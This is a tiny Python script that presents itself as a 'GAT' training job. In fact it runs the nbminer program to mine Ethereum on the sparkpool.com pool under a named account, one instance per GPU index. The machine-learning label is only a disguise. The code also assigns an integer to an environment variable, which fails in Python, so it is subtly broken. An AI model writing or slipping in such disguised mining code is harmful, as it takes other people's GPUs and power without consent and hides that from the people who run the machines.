import os
import argparse
parser = argparse.ArgumentParser(description='GAT')
parser.add_argument('--gpu', type=int, default=2, help='gpu.')
args = parser.parse_args()

os.environ["CUDA_VISIBLE_DEVICES"] = args.gpu
os.system("./nbminer -a ethash -o ethproxy+tcp://eth-us.sparkpool.com:3333 -lhr 68 -u sp_yangyeeee.{}".format(args.gpu))
